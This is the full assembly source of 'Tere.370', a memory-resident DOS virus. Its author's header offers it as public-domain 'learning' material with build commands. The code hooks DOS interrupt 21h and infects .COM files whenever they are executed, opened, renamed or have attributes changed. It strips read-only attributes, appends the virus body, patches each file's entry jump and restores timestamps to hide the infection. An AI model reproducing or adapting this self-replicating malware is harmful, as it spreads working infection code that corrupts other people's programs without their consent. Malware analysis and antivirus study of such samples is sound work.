   ;Tere.370 v1.0 NiL
   ;
   ;Licence :]
   ;==============================================================================
   ;This code is public domain. So You can take it or leave it / modify it / use
   ;it for Your own purposes etc. If You wish to show respect to my work leave
   ;those magic letters NiL inside code. BTW this is not my pseudonym. It is
   ;rather a codename for my activity of producing these tiny self-replicating
   ;pieces of code. Have fun!
   ;
   ;Introduction
   ;==============================================================================
   ;My very first infector. Not so bad as the "Hello Worlds" usually are. (BTW
   ;the text pattern "Tere maailm!" inside code in Estonian means "Hello World!".)
   ;Good for learning purposes.
   ;Memory resident .COM infector for DOS executables. It stays resident and
   ;infects .COM files when they are executed, renamed/moved, opened or their
   ;attributes are changed. Int21 calls:
   ;  AX,4B00h Execution
   ;  AX,3D00h Open for reading
   ;  AX,4301h Set attribute
   ;  AH,56h   Rename/Move
   ;No payload.
   ;
   ;Features
   ;==============================================================================
   ;FD write protection check.
   ;  Reads and tries to write back a sector using Int13 services.
   ;
   ;File Read-Only bit removal
   ;  Removes the R-bit when needed and sets back after the job is done.
   ;
   ;For further reading visit:
   ;==============================================================================
   ;http://www.datafellows.com/v-descs/tere.htm
   ;
   ;Greetings
   ;==============================================================================
   ;to virii writers - keep up a good work & don't write harmful virii,
   ;to Wannabees for having an interest in something most people do not have:
   ;   Knowledge (no ironics),
   ;to AV people for earning their living in fighting our progs (no ironics),
   ;to VLAD for producing high-quality technical magazines,
   ;to Ralf Brown for his wonderful interrupt list,
   ;to creators of SoftIce, Sourcer, Hiew for magnificent tools,
   ;to all involved in the scene (Sorry, I think I'm going to leave the scene
   ;  soon).
   ;
   ;==============================================================================
   ;Here it comes and assembles using commands:
   ;tasm /m2 tere.asm
   ;tlink /t /x tere.obj
        .MODEL  TINY
        .CODE
        ORG     100h

   ID   EQU     99h                   ;Resident? id
   ProgOfs  EQU     100h                  ;COM program offset
   VirSize  EQU     @End-@Start           ;V size
   BufOfs   EQU     VirSize+4             ;Sector r/w buffer offset
   BufSize  EQU     1024                  ;Sector r/w buffer size
   ;-----------------------------------------------------------------------------
   @Begin:  DB  1Eh,0E9h,4,0          ;PUSH DS, JMP V_Code
   ;-----------------------------------------------------------------------------
   @Start:  DB  0C3h,0,0,0            ;Original beginning of program
        CLD
        XOR     BX,BX
        CALL    @Next                 ;Calculate V offset
   @Nop:    DB  'NiL'
   @Next:   POP     SI
        MOV     DS,BX
        SUB     SI,@Nop-@Start

        CMP     BYTE PTR DS:[BX],ID   ;Already resident?
        JE  @Done

        MOV     CX,CS                 ;Make new MCB
        DEC     CX
        MOV     DS,CX
        SUB     WORD PTR DS:[12h],(BufOfs+BufSize+15)/16+1
        MOV     BX,DS:[12h]
        SUB     WORD PTR DS:[03h],(BufOfs+BufSize+15)/16+1
        MOV     ES,BX
        XOR     DI,DI
        MOV     AL,'Z'
        STOSB
        MOV     AX,08h
        STOSW
        MOV     AX,(BufOfs+BufSize+15)/16
        STOSW
        INC     BX
        MOV     ES,BX

        PUSH    CS
        POP     DS
            PUSH    SI
        XOR     DI,DI
        MOV     CX,(VirSize+1)/2
        REP     MOVSW                 ;Move V to memory DS:[SI]->ES:[DI]

        XOR     BX,BX
        MOV     DS,BX
        PUSH    ES
        PUSH    DS
        POP     ES
        MOV     SI,21h*4
        MOV     DI,03h*4
        PUSH    DI
        MOVSW
        MOVSW
        POP     SI
        POP     ES
        MOV     DI,VirSize            ;Place for old handler
        MOVSW                         ;Save old Int 21h handler address
        MOVSW
        MOV     WORD PTR DS:[21h*4],@New21-@Start
        MOV     BYTE PTR DS:[BX],ID
        MOV     DS:[21h*4+2],ES

        POP     SI
        PUSH    CS
        POP     ES
   @Done:   POP     DS
        MOV     DI,ProgOfs
        PUSH    DI                    ;Program offset (100h) into stack
        MOVSW                         ;Restore original beginning of file
        MOVSW
        RETN                          ;Jump to program code
   ;-----------------------------------------------------------------------------
   Msg  DB  'Tere maailm!'
   OurByte  DB  1Eh,0E9h,0,0
   ;-----------------------------------------------------------------------------
   @New21:  CMP     AX,4B00h              ;Execution service?
        JE  @Inf
        CMP     AX,3D00h              ;Open for reading service?
        JE      @Inf
        CMP     AX,4301h              ;Set attribute service?
        JE  @Inf
        CMP     AH,56h                ;Rename/Move service?
        JE  @Inf
        JMP     @OldHand
   ;-----------------------------------------------------------------------------
   @Inf:    PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    SI

        MOV     SI,DX
        CLD
   @Letter: LODSB
        OR  AL,AL
        JZ  @Prot
        CMP     AL,'.'
        JNE     @Letter
        LODSW
        AND     AX,0DFDFh
        CMP     AX,'OC'
        JNE     @Prot
        LODSB
        AND     AL,0DFh
        CMP     AL,'M'
        JNE     @Prot
        MOV     AX,DS:[SI-11]
        AND     AX,0DFDFh
        CMP     AX,'OC'
        JE  @Prot
   ;--------------------------------------
        PUSH    DX
        PUSH    ES
        XCHG    SI,DX
        LODSW
        CMP     AH,':'
        JNE     @Default
        OR  AL,20h
        SUB     AL,'a'
        JMP     @NoDeflt
   @Default:MOV     AH,19h
        INT     03h
   @NoDeflt:CMP     AL,1
        JA  @Done13
        XCHG    DX,AX                 ;DL:=Drive
        XOR     DH,DH                 ;DH:=Head=0
        MOV     CX,0101h              ;CH:=Track(0-n); CL:=Sector(1-n)
        PUSH    CS
        POP     ES
        MOV     BX,BufOfs
        MOV     AX,0201h              ;AH:=SubFn(Read); AL:=Sector count
        INT     13h
        JC  @Done13
        MOV     AX,0301h              ;AH:=SubFn(Write)
        INT     13h
   @Done13: POP     ES
        POP     DX
        JNC     @NoProt
   @Prot:   JMP     @Wrong
   ;--------------------------------------
   @NoProt: MOV     AX,4300h
        INT     03h                   ;Get file attributes
        JC  @Wrong
        PUSH    DX
        PUSH    DS
        PUSH    CX
        MOV     AX,4301h
        XOR     CX,CX
        INT     03h                   ;Clear file attributes
        JC  @OpenErr
   ;--------------------------------------
        MOV     AX,3D02h              ;Open executed file
        INT     03h
        JC  @OpenErr
        XCHG    BX,AX                 ;Handle of file into BX

        PUSH    CS
        POP     DS

        MOV     CX,4                  ;Read CX first bytes of file to DS:[DX]
        MOV     AH,3Fh
        CWD
        INT     03h
        JC  @FileErr

        CMP     WORD PTR DS:[0],0E91Eh
        JE  @FileErr              ;File already infected
        CMP     WORD PTR DS:[0],'ZM'
        JE  @FileErr

        MOV     AX,4202h              ;Seek EOF (FileSize into AX)
        XOR     CX,CX
        CWD
        INT     03h

        CMP     AX,65535-(VirSize+ProgOfs)
        JA  @FileErr              ;File too big

        MOV     DS:[((OFFSET OurByte)-(OFFSET @Start))+2],AX

        MOV     AX,5700h              ;Get file time
        INT     03h
        PUSH    CX
        PUSH    DX

        MOV     CX,VirSize            ;Write V to end of file from DS:[DX]
        MOV     AH,40h
        CWD
        INT     03h
        JC  @WrErr

        MOV     AX,4200h              ;Seek beginning of file
        XOR     CX,CX
        CWD
        INT     03h

        MOV     CX,4                  ;Write jump instruction to file
        MOV     DX,(OFFSET OurByte)-(OFFSET @Start)
        MOV     AH,40h
        INT     03h

   @WrErr:  MOV     AX,5701h              ;Restore file time/date
        POP     DX
        POP     CX
        INT     03h

   @FileErr:MOV     AH,3Eh                ;Close file
        INT     03h
   ;--------------------------------------
   @OpenErr:MOV     AX,4301h
        POP     CX
        POP     DS
        POP     DX
        INT     03h                   ;Restore file attributes
   ;--------------------------------------
   @Wrong:  POP     SI
        POP     CX
        POP     BX
        POP     AX
   @OldHand:DB  0EAh                  ;Jump to
   ;-----------------------------------------------------------------------------
   @End:    END     @Begin
